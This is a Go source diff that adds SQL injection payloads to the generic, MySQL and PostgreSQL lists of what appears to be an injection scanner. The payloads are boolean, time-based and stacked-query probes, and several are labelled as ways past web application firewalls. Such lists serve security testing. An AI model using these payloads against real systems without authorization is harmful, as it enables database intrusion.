@@ -168,6 +168,18 @@ var genericPayloads = []Payload{
 	{Value: "1 AND 1=1", Technique: TechBlind, DBType: Generic, Description: "Integer AND true"},
 	{Value: "1 AND 1=2", Technique: TechBlind, DBType: Generic, Description: "Integer AND false"},
 
+	// Math-based boolean differential (Acunetix technique — less WAF-blocked than 1=1)
+	{Value: "-1 OR 5*5=25 -- ", Technique: TechBlind, DBType: Generic, Description: "Math-based boolean true (integer)"},
+	{Value: "-1 OR 5*5=26 -- ", Technique: TechBlind, DBType: Generic, Description: "Math-based boolean false (integer)"},
+	{Value: "-1' OR 5*5=25 -- ", Technique: TechBlind, DBType: Generic, Description: "Math-based boolean true (string)"},
+	{Value: "-1' OR 5*5=26 -- ", Technique: TechBlind, DBType: Generic, Description: "Math-based boolean false (string)"},
+	{Value: "-1\" OR 5*5=25 -- ", Technique: TechBlind, DBType: Generic, Description: "Math-based boolean true (dquote)"},
+	{Value: "-1\" OR 5*5=26 -- ", Technique: TechBlind, DBType: Generic, Description: "Math-based boolean false (dquote)"},
+	{Value: "-1' OR 5*5=25 or 'a'='", Technique: TechBlind, DBType: Generic, Description: "Math boolean with string closure"},
+	{Value: "-1' OR 5*5=26 or 'a'='", Technique: TechBlind, DBType: Generic, Description: "Math boolean false with closure"},
+	{Value: "-1 OR 5*5=25", Technique: TechBlind, DBType: Generic, Description: "Math boolean no comment"},
+	{Value: "-1 OR 5*5=26", Technique: TechBlind, DBType: Generic, Description: "Math boolean false no comment"},
+
 	// WAF bypass variants
 	{Value: "' oR '1'='1", Technique: TechBlind, DBType: Generic, Description: "Case variation bypass", WAFBypass: true},
 	{Value: "' OR/**/'1'='1", Technique: TechBlind, DBType: Generic, Description: "Comment bypass", WAFBypass: true},
@@ -217,6 +229,11 @@ var mysqlPayloads = []Payload{
 	{Value: "' uNiOn SeLeCt NULL--", Technique: TechUnion, DBType: MySQL, Description: "Case mixing bypass", WAFBypass: true},
 	{Value: "-1' UNION SELECT 1,2,3--", Technique: TechUnion, DBType: MySQL, Description: "Negative ID union"},
 	{Value: "' AND SLEEP/**/(5)--", Technique: TechTimeBased, DBType: MySQL, Description: "Comment in function", WAFBypass: true},
+	{Value: "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z", Technique: TechTimeBased, DBType: MySQL, Description: "XOR sysdate WAF bypass", WAFBypass: true},
+	{Value: "0\"XOR(if(now()=sysdate(),sleep(5),0))XOR\"Z", Technique: TechTimeBased, DBType: MySQL, Description: "XOR sysdate dquote WAF bypass", WAFBypass: true},
+	{Value: "0'XOR(1*if(now()=sysdate(),sleep(5),0))XOR'Z", Technique: TechTimeBased, DBType: MySQL, Description: "XOR multiply sysdate bypass", WAFBypass: true},
+	{Value: "1*if(now()=sysdate(),sleep(5),0)", Technique: TechTimeBased, DBType: MySQL, Description: "Inline sysdate no quote", WAFBypass: true},
+	{Value: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", Technique: TechTimeBased, DBType: MySQL, Description: "Triple subquery WAF bypass", WAFBypass: true},
 }
 
 // PostgreSQL-specific payloads.
@@ -237,6 +254,10 @@ var postgresPayloads = []Payload{
 	{Value: "' AND pg_sleep(5)--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "pg_sleep delay"},
 	{Value: "'; SELECT pg_sleep(5)--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "Stacked pg_sleep"},
 	{Value: "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "Conditional pg_sleep"},
+	{Value: "-1 OR 297=(SELECT 297 FROM PG_SLEEP(5))--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "SELECT-match pg_sleep integer", WAFBypass: true},
+	{Value: "-1' OR 297=(SELECT 297 FROM PG_SLEEP(5))--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "SELECT-match pg_sleep string", WAFBypass: true},
+	{Value: "-1) OR 297=(SELECT 297 FROM PG_SLEEP(5))--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "SELECT-match pg_sleep paren", WAFBypass: true},
+	{Value: "-1)) OR 297=(SELECT 297 FROM PG_SLEEP(5))--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "SELECT-match pg_sleep double paren", WAFBypass: true},
 
 	// Stacked queries (PostgreSQL supports these)
 	{Value: "'; SELECT version()--", Technique: TechStacked, DBType: PostgreSQL, Description: "Stacked version"},
